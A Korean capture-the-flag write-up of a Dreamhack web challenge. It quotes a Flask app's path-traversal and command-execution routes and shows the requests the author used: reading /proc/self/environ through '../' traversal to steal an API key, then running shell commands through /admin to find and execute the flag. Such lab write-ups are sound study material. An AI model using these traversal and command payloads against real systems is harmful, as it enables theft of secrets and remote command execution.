created: 2026-01-19 06:47
category: #web 
link: https://dreamhack.io/wargame/challenges/417

# Write-up
```python
@app.route("/file", methods=["GET"])
def file():
    path = request.args.get("path", None)
    if path:
        data = open("./files/" + path).read()  # 취약점 가능성!!
        return data
    return "Error !"
```
- 파라미터로 받은 `path`를 그대로 `./files/` 경로 문자열 뒤에 붙인다. 따라서 외부의 다른 경로에 있는 파일들도 모두 탐색 가능하다. 

```python
def key_required(view):
    @wraps(view)
    def wrapped_view(**kwargs):
        apikey = request.args.get("API_KEY", None)
        if API_KEY and apikey:
            if apikey == API_KEY:
                return view(**kwargs)
        return "Access Denied !"

    return wrapped_view


@app.route("/admin", methods=["GET"])
@key_required
def admin():
    cmd = request.args.get("cmd", None)
    if cmd:
        result = subprocess.getoutput(cmd)
        return result
    else:
        return "Error !"
```
- `/admin` API는 분석해보니 파라미터로 `API_KEY`를 받아서 인증을 한다. 

```python
API_KEY = os.environ.get("API_KEY", None)
```
- 환경변수에 `API_KEY`가 저장되어 있다는 것을 알 수 있다. 

따라서 다음과 같은 계획을 세웠다. 
1. 환경변수 `API_KEY`가 저장되어 있는 파일을 찾아서 해당 값을 획득.
2. `API_KEY`를 통해 `/admin` API를 사용할 수 있게 됨. 자유롭게 리눅스 명령어를 입력하여 환경을 살펴보며 플래그를 찾기.

찾아보니 현재 프로세스에 등록된 환경변수를 보기 위해 `/proc/self/environ` 파일을 활용할 수 있다고 들었다.
그래서 `/file?path=../../proc/self/environ` 경로로 접속하니 실제로 `API_KEY`의 값을 찾을 수 있었다!

이후 `/admin` 경로를 통해 리눅스 시스템 명령어를 사용할 수 있었다. 아무런 힌트도 없어서 플래그를 찾는데 애먹었다. 
`/admin?cmd=find / -name "*flag*"&API_KEY={API_KEY 값}` 즉, `find / -name "*flag*"` 명령어를 통해 루트 경로부터 이름에 "flag" 문자열을 가진 파일을 모두 조회하였다. 

```txt
/usr/lib/x86_64-linux-gnu/perl/5.32.1/bits/waitflags.ph /usr/lib/x86_64-linux-gnu/perl/5.32.1/bits/ss_flags.ph /usr/lib/python3/dist-packages/mercurial/helptext/flags.txt /usr/lib/python3/dist-packages/mercurial/revlogutils/__pycache__/flagutil.cpython-39.pyc /usr/lib/python3/dist-packages/mercurial/revlogutils/flagutil.py /usr/include/x86_64-linux-gnu/asm/processor-flags.h /usr/include/x86_64-linux-gnu/bits/termios-c_oflag.h /usr/include/x86_64-linux-gnu/bits/mman-map-flags-generic.h /usr/include/x86_64-linux-gnu/bits/termios-c_iflag.h /usr/include/x86_64-linux-gnu/bits/waitflags.h /usr/include/x86_64-linux-gnu/bits/termios-c_cflag.h /usr/include/x86_64-linux-gnu/bits/ss_flags.h /usr/include/x86_64-linux-gnu/bits/termios-c_lflag.h /usr/include/lzma/stream_flags.h /usr/include/linux/kernel-page-flags.h /usr/include/linux/tty_flags.h /usr/bin/dpkg-buildflags /usr/share/man/fr/man1/dpkg-buildflags.1.gz /usr/share/man/nl/man1/dpkg-buildflags.1.gz /usr/share/man/man1/dpkg-buildflags.1.gz /usr/share/man/de/man1/dpkg-buildflags.1.gz /usr/share/man/sv/man1/dpkg-buildflags.1.gz /usr/share/man/pt/man1/dpkg-buildflags.1.gz /usr/share/man/man3/security_compute_av_flags_raw.3.gz /usr/share/man/man3/security_compute_av_flags.3.gz /usr/share/man/man3/set_matchpathcon_flags.3.gz /usr/share/dpkg/buildflags.mk /sys/devices/platform/serial8250/tty/ttyS0/flags /sys/devices/virtio-mmio-cmdline/virtio-mmio.4/virtio4/net/eth0/flags /sys/devices/virtual/net/lo/flags /proc/kpageflags /flag
```
그 결과로 뭔가 많이 나오는데, 마지막에 `/flag`가 있는 것을 확인할 수 있었다. 이게 가장 의심이 되었다. 

그런데 `cmd=cat /flag`로 명령어를 실행하니 internal server error가 발생했다. 뭔가 이상해서 좀 더 살펴보니 실행파일이였다. 
`cmd=ls -al /flag`로 실행하니 다음과 같이 나왔다.
```txt
---x--x--x 1 root root 16608 Aug 18 2023 /flag
```

최종적으로, `cmd=/flag`로 명령어를 실행하여 플래그를 획득할 수 있었다.

# Reference
- https://linuxias.github.io/linux/debugging/proc_filesystem/
- https://docs.python.org/3/library/os.html#os.environ
- https://coding-factory.tistory.com/804